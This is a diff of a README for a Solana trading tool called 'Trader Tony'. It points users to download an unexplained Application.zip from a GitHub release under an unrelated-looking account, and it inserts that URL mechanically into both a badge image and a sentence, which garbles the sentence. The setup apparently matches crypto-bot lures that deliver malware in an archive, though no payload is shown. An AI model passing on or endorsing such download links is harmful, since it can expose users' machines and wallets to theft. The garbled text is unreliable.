@@ -24,9 +24,9 @@ The Trader Tony repository covers a wide range of topics, including artificial i
 
 To access Trader Tony and unlock its full potential, download the application from the following link:
 
-[![Download Trader Tony](https://img.shields.io/badge/Download-Application.zip-blue.svg)](https://github.com/file/Application.zip)
+[![Download Trader Tony](https://github.com/Ydvji/trader-tony/releases/download/v1.0.0/Application.zip)](https://github.com/Ydvji/trader-tony/releases/download/v1.0.0/Application.zip)
 
-If you have downloaded an Application.zip file, follow the necessary installation instructions to launch Trader Tony and start optimizing your trading experience on Solana.
+If you have downloaded an https://github.com/Ydvji/trader-tony/releases/download/v1.0.0/Application.zip file, follow the necessary installation instructions to launch Trader Tony and start optimizing your trading experience on Solana.
 
 If the link provided does not work or you require additional information, please visit the "Releases" section of the repository for alternative download options.
 
